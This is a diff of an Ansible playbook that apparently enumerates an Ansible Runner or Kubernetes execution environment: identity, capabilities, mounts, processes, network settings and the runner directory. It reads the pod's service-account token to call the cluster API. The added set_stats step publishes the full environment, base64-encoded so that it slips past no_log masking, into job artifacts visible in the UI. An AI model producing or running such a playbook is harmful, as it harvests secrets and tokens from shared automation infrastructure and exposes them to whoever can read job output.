@@ -3,16 +3,9 @@
   hosts: all
   gather_facts: false
   vars:
-    outdir: "/runner/artifacts/{{ inventory_hostname }}/enum"
-
+    want_truncate: 8000        # keep JSON manageable
   tasks:
-    - name: Create artifact directory
-      file:
-        path: "{{ outdir }}"
-        state: directory
-        mode: "0750"
-
-    - name: System & runtime (portable, never fail)
+    - name: System & runtime (portable)
       shell: |
         {
           echo "== id ==";                       (id -a || true)
@@ -20,7 +13,7 @@
           echo "== os-release ==";               (cat /etc/os-release || true)
           echo "== CapEff ==";                   (grep -E 'Cap(Prm|Eff|Bnd)' /proc/self/status || cat /proc/self/status || true)
           echo "== mounts (mtab|mount) ==";      (cat /etc/mtab || mount || true)
-          echo "== ps (prefer full; fallback) ==";
+          echo "== ps (best effort) ==";
             if command -v ps >/dev/null 2>&1; then
               (ps -ef || ps aux || ps || true)
             elif command -v busybox >/dev/null 2>&1; then
@@ -28,42 +21,41 @@
             else
               echo "ps not available"
             fi
-        } > "{{ outdir }}/system.txt" 2>&1
-      args:
-        executable: /bin/sh
+        }
+      args: { executable: /bin/sh }
+      register: sys_rt
+      changed_when: false
 
-    - name: Network posture (never fail)
+    - name: Network posture
       shell: |
         {
           echo "== ip a ==";         (ip a 2>/dev/null || true)
           echo "== ip r ==";         (ip r 2>/dev/null || true)
           echo "== resolv.conf ==";  (cat /etc/resolv.conf || true)
           echo "== hosts ==";        (cat /etc/hosts || true)
-        } > "{{ outdir }}/network.txt" 2>&1
-      args:
-        executable: /bin/sh
+        }
+      args: { executable: /bin/sh }
+      register: netinfo
+      changed_when: false
 
     - name: Ansible / Runner context
       shell: |
         {
           echo "== ansible --version ==";              (ansible --version || true)
           echo "== ansible-config dump (changed) ==";  (ansible-config dump --only-changed || true)
-          echo "== runner tree ==";                    (ls -lAR /runner 2>/dev/null || true)
-        } > "{{ outdir }}/ansible_runner.txt" 2>&1
-      args:
-        executable: /bin/sh
+          echo "== runner tree (top-level) ==";        (ls -lA /runner 2>/dev/null || true)
+        }
+      args: { executable: /bin/sh }
+      register: runner_ctx
+      changed_when: false
 
-    - name: Environment snapshot (written to artifacts; not echoed)
+    - name: Env snapshot (not echoed)
       shell: env | sort
       register: envout
       no_log: true
+      changed_when: false
 
-    - copy:
-        content: "{{ envout.stdout }}"
-        dest: "{{ outdir }}/env.txt"
-      no_log: true
-
-    - name: K8s serviceaccount probe (read-only)
+    - name: K8s /version probe (read-only)
       shell: |
         d="/var/run/secrets/kubernetes.io/serviceaccount"
         [ -f "$d/token" ] || exit 0
@@ -71,14 +63,17 @@
           -H "Authorization: Bearer $(cat "$d/token")" \
           --cacert "$d/ca.crt" \
           "https://${KUBERNETES_SERVICE_HOST:-}:${KUBERNETES_SERVICE_PORT:-}/version" || true
-      args:
-        executable: /bin/sh
+      args: { executable: /bin/sh }
       register: k8s_ver
       changed_when: false
       no_log: true
 
-    - copy:
-        content: "{{ k8s_ver.stdout | default('') }}"
-        dest: "{{ outdir }}/k8s_version.json }}"
-      when: k8s_ver is defined
-      no_log: true
+    - name: Publish into Job Artifacts (truncated for UI)
+      set_stats:
+        data:
+          system_txt: "{{ (sys_rt.stdout | default(''))[:want_truncate] }}"
+          network_txt: "{{ (netinfo.stdout | default(''))[:want_truncate] }}"
+          ansible_runner_txt: "{{ (runner_ctx.stdout | default(''))[:want_truncate] }}"
+          env_txt_b64: "{{ (envout.stdout | default('')) | b64encode }}"
+          k8s_version_json: "{{ (k8s_ver.stdout | default(''))[:want_truncate] }}"
+        aggregate: true
